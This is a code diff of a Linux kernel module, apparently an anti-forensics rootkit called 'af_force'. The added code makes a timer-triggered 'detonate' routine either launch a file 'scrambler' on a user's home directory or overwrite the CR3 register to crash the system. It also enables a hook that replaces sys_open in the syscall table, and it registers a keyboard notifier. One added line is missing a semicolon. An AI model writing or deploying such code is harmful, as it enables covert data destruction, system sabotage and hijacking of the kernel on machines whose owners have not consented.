@@ -72,10 +72,15 @@ static int call_scrambler(void) {
 	// char * envp[] = { "HOME=/", NULL };
 	// char * argv[] = { "/usr/bin/touch", "/home/bob/touched", NULL };
     char *argv[] = {
-            "/usr/bin/touch",
-            "/home/bob/TOUCHED_SON",
-            NULL,
-        };
+        "/usr/bin/scrambler",
+        "/home/bob/files/",
+        NULL
+    };
+    // char *argv[] = {
+    //         "/usr/bin/touch",
+    //         "/home/bob/TOUCHED_SON_NEW",
+    //         NULL,
+    //     };
     int res;
     res = call_usermodehelper(argv[0], argv, NULL, UMH_NO_WAIT);
     printk(KERN_INFO "umh call result: %i\n", res);
@@ -190,15 +195,23 @@ static long device_ioctl(struct file *filp, unsigned int cmd, unsigned long args
 
 void detonate (unsigned long data)
 {
-	// int res;
     if ( armed == 1 ) {
+        printk(KERN_DEBUG "AF is: %i\n", AF);
         printk(KERN_DEBUG "af_force: Kaboom!\n");
-        // call_scrambler();
-        // mod_crs(); // a true nuke
-        // printk(KERN_DEBUG "uesrmodehelper_exec result: %i", res);
+        if ( AF == 1 ){
+            // Scrambler:
+            call_scrambler();
+        } else if ( AF == 2 ){
+            // System Request Shutdown
+        } else if ( AF == 3 ){
+            // Write cr3
+            mod_cr3();
+        } else {
+            printk(KERN_DEBUG "af_force: No AF set, passing...\n")
+        }
     } else {
         printk(KERN_DEBUG "af_force: It's quiet...\n");
-        call_scrambler();
+        // call_scrambler();
         // printk(KERN_DEBUG "af_force: cr3 is %16.16llx\n", ret_cr3());
         // printk(KERN_DEBUG "af_force: writing new cr3...");
         // mod_cr3();
@@ -227,6 +240,7 @@ static struct file_operations fops={
 
 
 /*return -1. this will prevent any process from opening any file*/
+/*return origial sys open to silently pass ;)*/
 asmlinkage long hacked_sys_open(const char *pathname, int flags, int mode)
 {
     /*
@@ -268,30 +282,7 @@ int make_ro(unsigned long address){
     pte_t *pte = lookup_address(address, &level);
     pte->pte = pte->pte &~_PAGE_RW;
     return 0;
-} 
-
-// system_call_table_addr = (void*)0xffffffff81601680;
-//         sys_call_table=(void*)0xffffffff81a001c0;
-
-//         // Make rw:
-//         make_rw((unsigned long)sys_call_table);
-        
-//         /*store original location of sys_open. Alter sys_call_table
-//  to point _ _NR_open to our hacked_sys_open*/
-//         original_sys_open =(void * )xchg(&sys_call_table[__NR_open], hacked_sys_open);
-       
-//         return 0;
-// }
-
-// static void __exit my_exit (void)
-// {
-        // make_ro((unsigned long)sys_call_table);
-        // /*restore original sys_open in sys_call_table*/
-        // xchg(&sys_call_table[__NR_open], original_sys_open);
-        // printk(KERN_INFO "intercept_open unloaded!");
-        // return 0;
-
-// }       
+}      
 
 static int setup_intercept(void)
 {
@@ -319,7 +310,6 @@ static int cleanup_intercept(void)
 }
 
 
-
 static int af_init(void)
 {   
     // Module Registration:
@@ -336,13 +326,11 @@ static int af_init(void)
     printk(KERN_DEBUG "af_force: Starting timer to fire in 5s (%ld)\n", jiffies );
 
     // Intercepts:
-    // setup_intercept();
+    setup_intercept();
 
     register_keyboard_notifier(&nb);
     return 0;
 }
-
-
 
 
 static void af_exit(void)
@@ -352,7 +340,7 @@ static void af_exit(void)
     unregister_keyboard_notifier(&nb);
 
     // Reset syscall_table:
-    // cleanup_intercept();
+    cleanup_intercept();
 
     // Module Deregistration:
     device_destroy(my_class,MKDEV(major_no,0));
